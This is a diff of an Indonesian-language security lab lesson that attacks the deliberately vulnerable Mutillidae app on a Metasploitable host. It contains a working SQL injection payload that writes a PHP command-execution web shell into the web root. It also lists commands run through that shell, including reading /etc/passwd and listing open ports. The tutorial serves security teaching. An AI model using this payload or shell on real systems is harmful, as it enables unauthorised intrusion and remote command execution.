@@ -16,24 +16,31 @@ AppArmor dalam OS turunan Ubuntu berfungsi untuk membatasi resource dari aktivit
 ' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/mutillidae/execute_command.php' -- 
 ```
 Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah tidak akan menampilkan hasil, justru Authentication Error. Namun disisi lain akan membuat file **execute_command.php**
+![](/assets/lesson-9/injection_result.JPG)
 
-* **Step 5** : Melihat hasil operasi dengan command berikut pada OS Metasploitable `cat /var/www/mutillidae/execute_command.php` 
+
+* **Step 5** : Melihat hasil operasi dengan web browser `http://10.151.36.64/mutillidae/execute_command.php` 
+![](/assets/lesson-10/backdoor_2.JPG)
+
 
 ### \# Menggunakan Backdoor untuk pengamatan dasar
 
-* **Step 1** : Buka halaman php yang sudah kita buat `http://10.151.36.64/mutillidae/execute_command.php`
-
-* **Step 2** : Masukan command linux pada textbox tersebut `whoami; pwd; w`.
+* **Step 1** : Masukan command linux pada textbox tersebut `whoami; pwd; w`.
 **whoami** : melihat username yang digunakan
 **pwd** : melihat working directory
 **w** : melihar user yang sedang login dan dikerjakan
+![](/assets/lesson-10/backdoor_3.JPG)
 
-* **Step 3** : Masukan command linux pada textbox tersebut `cat /etc/passwd` dan `netstat -nao | grep "0.0.0.0:"`.
+* **Step 2** : Masukan command linux pada textbox tersebut `cat /etc/passwd` dan `netstat -nao | grep "0.0.0.0:"`.
 **cat /etc/passwd** : melihat informasi untuk login, dengan field antara lain Username, Password Existance, User ID, Group ID, Gecos, Home Directory, and Shell
 **netstat -nao | grep "0.0.0.0:"** : melihat koneksi port yang sedang berlangsung pada ip 0.0.0.0
+![](/assets/lesson-10/backdoor_4.JPG)
 
 Terlihat ada user-user yang potensial untuk diserang seperti user apache, mysql, dll.
-Terlihat ada port-port yang biasa digunakan oleh suatu service yang potensial untuk diserang seperti user apache, mysql, dll.
+
+![](/assets/lesson-10/backdoor_5.JPG)
+
+Terlihat ada port-port yang biasa digunakan oleh suatu service yang potensial untuk diserang seperti mysql, dll.
 
 ### \# Menggunakan Backdoor untuk pengamatan Database
 
